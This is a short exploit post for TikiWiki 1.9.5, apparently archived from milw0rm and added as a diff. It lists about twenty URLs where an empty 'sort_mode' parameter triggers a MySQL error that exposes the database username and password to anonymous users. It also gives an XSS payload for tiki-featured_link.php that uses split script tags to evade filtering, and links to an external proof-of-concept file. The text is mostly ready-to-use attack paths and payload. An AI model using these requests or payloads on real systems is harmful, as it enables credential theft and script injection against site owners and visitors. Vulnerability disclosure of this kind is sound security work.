@@ -1,0 +1,42 @@
+/*==========================================*/
+//tikiwiki version 1.9.5 (CVS) -Sirius-  (PoC)
+// Product: Tikiwiki 
+// URL: http://tikiwiki.org/
+// RISK: critical
+/*==========================================*/
+
+
+
+
+there's a critical security bug in tikiwiki version 1.9.5 (CVS) -Sirius-
+a anonymous user , can dump the mysql user & passwd just by creating a mysql error with the "sort_mode" var , with those following links :
+/tiki-listpages.php?offset=0&sort_mode=
+/tiki-lastchanges.php?days=1&offset=0&sort_mode=
+/messu-archive.php?sort_mode=
+/messu-mailbox.php?sort_mode=
+/messu-sent.php?sort_mode=
+/tiki-directory_add_site.php?sort_mode=
+/tiki-directory_ranking.php?sort_mode=
+/tiki-directory_search.php?sort_mode=
+/tiki-forums.php?sort_mode=
+/tiki-view_forum.php?forumId=
+/tiki-friends.php?sort_mode=
+/tiki-list_blogs.php?sort_mode=
+/tiki-list_faqs.php?sort_mode=
+/tiki-list_trackers.php?sort_mode=
+/tiki-list_users.php?sort_mode=
+/tiki-my_tiki.php?sort_mode=
+/tiki-notepad_list.php?sort_mode=
+/tiki-orphan_pages.php?sort_mode=
+/tiki-shoutbox.php?sort_mode=
+/tiki-usermenu.php?sort_mode=
+/tiki-webmail_contacts.php?sort_mode=
+
+a proof of concept is disponible here : http://cockor.free.fr/PoC.swf
+
+there's also a xss here :
+/tiki-featured_link.php?type=f&url=" ></iframe><scr</script>ipt>alert('XSS')</scri</script>pt> <!--
+
+regards , securfrog 
+
+# milw0rm.com [2006-11-01]
